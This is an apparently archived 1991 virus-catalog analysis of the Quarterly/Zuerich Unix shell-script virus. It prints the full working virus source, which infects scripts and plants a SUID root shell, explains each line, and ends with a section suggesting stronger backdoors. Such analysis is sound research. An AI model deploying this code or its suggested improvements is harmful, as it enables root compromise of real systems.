= Computer Virus Catalog 1.2: Quarterly / Zuerich Virus (23-Aug-1991) =
Entry...............: Quarterly / Zuerich Virus
Alias(es)...........: USENIX-Virus
Virus Strain........: Quarterly strain
Virus detected when.: 1985 / 1991
              where.: ? / Zuerich
Classification......: (Bourne-)Shell-script-virus, direct action, 
                      prefix
Length of Virus.....: almost 680 Bytes in 25 lines
--------------------- Preconditions ----------------------------------
Operating System(s).: UNIX
Version/Release.....: *
Computer model(s)...: *
--------------------- Attributes -------------------------------------
Easy Identification.: The virus resides in the beginning of a Shell-
                      script. 
                      The end of the viral part of the script is 
                      marked: "# mark" and a command in the viral code 
                      is looking for this mark : "... grep '^# mark$'.
Type of infection...: The virus is executed as a background process.
                      All outputs are redirected to /dev/null.
                      It infects all shell-scripts in the directories 
                      described below. A shell-script must start with 
                      "#!/bin/sh". Already infected scripts aren't
                      infected twice. The virus and the uninfected
                      script are concatenated in the /tmp-directory
                      and then copied to replace the original script.
Infection Trigger...: Any time an infected shell-script is run.
Storage media affected: Filesystem-directories: /bin, /usr/bin, 
                        /u*/*/bin and the currently active directory
Damage..............: copies the shell /bin/sh with superuser-status
                      to /bin/gift, gives access to all users and 
                      sets the SUID-bit. Anyone who executes /bin/gift
                      gains superuser-status. 
Damage Trigger......: an infected script is run by 'root'
Particularities.....: 
Similarities........: ---
--------------------- Agents -----------------------------------------
Countermeasures.....: 
Countermeasures successful: 
Standard means......: Files without write permission cannot get 
                      infected, even the owner can save the files that 
                      way (the virus doesn't use chmod to access a 
                      file).
                      Root must be very careful with any shell-script. 
--------------------- Acknowledgement --------------------------------
Location............: Virus Test Center, University Hamburg, Germany
Classification......: Uwe Ellermann
Documentation by....: Uwe Ellermann
Date................: 23-August-1991
Update..............: 
Information Source..: DEC ULTRIX Reference Pages
===================== End of Quarterly / Zuerich - Virus =============


Virus code:
----------------------------------------
( 1)  #!/bin/sh
( 2)
( 3)  ( for i in * /bin/* /usr/bin/* /u*/*/bin/* ; do
( 4)      if sed 1q $i | grep '^#![     ]*/bin/sh' ; then
( 5)        if grep '^# mark$' $i ; then
( 6)          :
( 7)        else
( 8)          trap "/bin/rm -f /tmp/x$$" 0 1 2 13 15
( 9)          sed 1q $i > /tmp/x$$
(10)          sed '1d
(11)              /^#mark$/q' $0 >> /tmp/x$$
(12)          sed 1d $i >> /tmp/x$$
(13)          cp /tmp/x$$ $i
(14)        fi
(15)      fi
(16)    done
(17)    if ls -l /tmp/x$$ | grep root ; then
(18)      /bin/rm -f /tmp/gift
(19)      cp /bin/sh /tmp/gift
(20)      chmod 4777 /tmp/gift
(21)      echo gift | mail  # insert E-mail address here
(22)    fi
(23)    /bin/rm /tmp/x$$
(24)  ) >/dev/null 2>/dev/null &
(25)  # mark
----------------------------------------
End of virus code


Description in detail:
======================
line (1): Marks the file as a shell-script file.
line (3): Runs line 4 to line 16 for every file matching the four patterns.
          Assigns the filenames sequentially to the variable i.
line (4): Tests the first line of a file for the pattern, that begins 
          with a string like the one in line 1. If such a string is
          found, the file must be a shell-script.
line (5): Tests, if the virus is already in the shell-script.
line (6):    if yes then do nothing.
line (8-13): else infect the file.
line (8): Traps the incoming signals 0 1 2 13 15 (that are logout, hangup,
          interrupt, write to a pipe with no one to read it, software 
          termination signal)
          removes the file /tmp/x$$ when a signal is received.
          ($$ is replaced by the process-number.)
line (9): Create the file /tmp/x$$ and copy the first line of the 
          uninfected file to it (i.e. '#!/bin/sh').
line (10+11): Append the virus-code to the tmp-file. (line 2 till '# mark')
line (12): Append the rest of the uninfected file to the tmp-file.
line (13): Copy the tmp-file to the uninfected file. This erases the 
           uninfected file - write-permission must be given.
           If no write-permission is available, the file remains 
           uninfected!
line (17): If the file was executed by 'root' and a file was infected,
           a security hole is created (line 18-21).
line (19): Copies the shell /bin/sh to /tmp/gift. The owner of /tmp/gift 
           is root.
line (20): chmod gives access to /tmp/gift to all users and sets the 
           SUID-bit (Set User ID). All commands given with the 
           /tmp/gift - shell will have root-privileges.
line (21): Mails someone, that the security-hole is created. This gives 
           a trace to the attacker.
line (24): All outputs of this process are redirected to /dev/null
           & this process is a background-process.           
line (25): The end-mark of the virus-code.

Possible Improvements: 
======================
Recognition of shell-scripts: usually they  don't need to start 
with "#!/bin/sh".
  -> 'file'-command gives information about a file, but is very slow.
The security-hole: The /tmp-directory is cleared from time to time 
(i.e. reboot)
  -> /bin would perhaps be better, but would cause more suspicion.
The security-hole: Someone who wants to take advantage of the 
security-hole must have access to the system. It can only give 
su-privilege to users of the system. 
  -> adding a new user to the /etc/passwd 
Traces / Identification: If a file gets infected, its owner-name is 
changed to the name of the user, who executed the virus. So the 
occurence of changed owner-names could cause suspicion.
                      
Epidemic considerations:
========================
  The affected directories /bin and /usr/bin are not likely to get
infected, unless root executes an infected shell-script. Users are
(usually) not allowed to write to these directories. 
  The directories /u*/*/bin are not available in the test-environment.
Instead /usr/users/*/bin would hit the script-files  of different 
users in the test-environment.
  During a typical infection a user would execute an infected 
script-file (usually owned by another user, but with execution-
permission to public) infecting all shell-scripts the users has write-
permission to. Usually this should(!) only be the files owned by 
the user. But if the user is root, all script-files - also files
of other users - will get infected. This shows (once again) the 
danger in the superuser-concept.
                 
